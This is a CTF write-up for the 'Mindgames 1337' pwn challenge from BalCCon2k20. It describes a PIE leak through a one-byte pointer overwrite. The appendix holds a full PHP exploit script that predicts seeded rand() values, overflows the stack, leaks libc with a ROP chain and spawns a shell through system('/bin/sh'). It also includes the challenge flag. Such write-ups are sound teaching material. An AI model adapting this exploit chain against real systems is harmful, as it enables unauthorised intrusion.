# Mindgames 1337 - BalCCon2k20 CTF (pwn, 457p, 11 solved)
## Introduction

Mindgames 1337 is a pwn task. This is the second challenge of the Mindgames
serie (Mindgames 1336, 1337, 1338). This challenge has PIE.

A Linux ELF file is provided. It is a guessing game. The highest score belongs
to a randomly generated Star Wars character, but can be replaced by the user's
name.

## Reverse engineering

Most of the reverse engineering has been explained for Mindgames 1336's writeup.

The only part left unexplored is the menu that displays high score. It is
relatively simple :
```c
printf("Current highscore:\n%d\t by \t %s\n", highScore, player);
```

The interesting part is the way variables are arranged in the BSS:
```c
/* 0x40C0 */ char name[0x20];
/* 0x40E0 */ unsigned int score;
/* 0x40E8 */ char *player;
```

## Exploitation

The main vulnerability here stays the same : the high score function is still
vulnerable to a stack-base buffer overflow. However, due to the addition of PIE,
it is not possible to leak the libc anymore without leaking the binary's base
address.

As explained in the writeup for Mindgames 1336, this vulnerability also smashes
the global variables in BSS, in particular the score and a pointer to the user's
name.

It is possible to overwrite only the last byte of `player` with `0xE8` so that
it points to itself.

Displaying the highscore will then leak the address of `player` which is
relative to the base address of the program.

The rest of the exploitation is the same as Mindgames 1336's.

**Flag**: `BCTF{and_n0w_y0u_ate_my_PIE?}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Socket.php";

const POPRDI = 0x000015d3;
const PUTS   = 0x00001040;
const LSM    = 0x00003fe0;
const NEWHS  = 0x00001349;

const BINSH  = 0x00181519;
const SYSTEM = 0x000449c0;

const HOST = "pwn.institute";
const PORT = 41337;

function menu(Tube $t)
{
	$t->expectLine("What do you want to do?");
	$t->expectLine(" 1) Show Highscore");
	$t->expectLine(" 2) Play the game");
	$t->expectLine(" 3) Exit");
	$t->expect("> ");
}

function hs(Tube $t)
{
	menu($t);
	$t->write("1\n");

	$t->expectLine("Current highscore:");
	$line = $t->readLine();

	list($score, , $player) = explode("\t", $line, 3);
	$score |= 0;
	$player = substr($player, 1);

	return [$score, $player];
}

printf("[*] Creating process\n");
$time = microtime(true);

$t = new Socket(HOST, PORT);
$date = strftime("%Y-%m-%d %H:%M:%S"); // // it's okay because we use NTP ;-)
$t->expectLine("Hello there! It's $date and the weather looks pretty nice!");

//$t->expect("Hello there! It's ");
//$date = $t->read(strlen("2020-09-25 21:26:35"));
//$t->expectLine(" and the weather looks pretty nice!");

$t->expectLine("");
$t->expectLine("");
$t->expectLine("We should play a game of the mind!");
$t->expect("> ");

$ffi = FFI::load("rand.h");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$time = strtotime($date);
$ffi->srand($time);
$ffi->rand(); // player
$ffi->rand(); // score

printf("[*] Leak PIE\n");
menu($t);
$t->write("2\n");

$t->expectLine("Can you guess my numbers?");
$t->expect("> ");

for($i = 0; $i < 32; $i++) {
	$guess = $ffi->rand();
	$t->write("$guess\n");
}

for($i = 0; $i < 32; $i++) {
	$t->expectLine("You were lucky this time!");
	$t->expect(">");
}

$t->write("-1\n");
$t->expectLine("Game over!");
$t->expectLine("New Highscore! Amazing!");

/* Leak */
$payload  = str_pad("XeR", 0x20, "\x00");
$payload .= pack("Q", 0); // faster
$payload .= "\xe8";

$t->expect("Give me your name: ");
$t->write($payload);

$hs   = hs($t);
$addr = str_pad(substr($hs[1], 0, 8), 8, "\x00");
$base = unpack("Q", $addr)[1] - 0x40e8;

$poprdi = $base + POPRDI;
$lsm    = $base + LSM;
$puts   = $base + PUTS;
$newhs  = $base + NEWHS;

printf("[+] base: %X\n", $base);
printf("\n");

printf("[*] Leak libc\n");
menu($t);
$t->write("2\n");

$t->expectLine("Can you guess my numbers?");
$t->expect("> ");

$t->write("-1\n");
$t->expectLine("Game over!");
$t->expectLine("New Highscore! Amazing!");

/* Leak libc */
$payload  = str_repeat("x", 0x110);
$payload .= pack("Q", 0xdeadbeef); // rbp
$payload .= pack("Q*",
	$poprdi, $lsm,
	$puts,
	$newhs,
); // rip

$t->expect("Give me your name: ");
$t->write($payload);

$leak = $t->readLine();
$leak = str_pad(substr($leak, 0, 8), 8, "\x00");
$addr = unpack("Q", $leak)[1];

$libc  = $addr & ~0xFFF;
$libc -= 0x23000;

printf("[+] libc: %X\n", $libc);
printf("\n");


/* shell */
$payload  = str_repeat("x", 0x110);
$payload .= pack("Q", 0xdeadbeef); // rbp
$payload .= pack("Q*",
	$poprdi, $libc + BINSH,
	$libc + SYSTEM,
	-1
); // rip

$t->expect("Give me your name: ");
$t->write($payload);

printf("[!] shell\n");
$t->pipe();
```
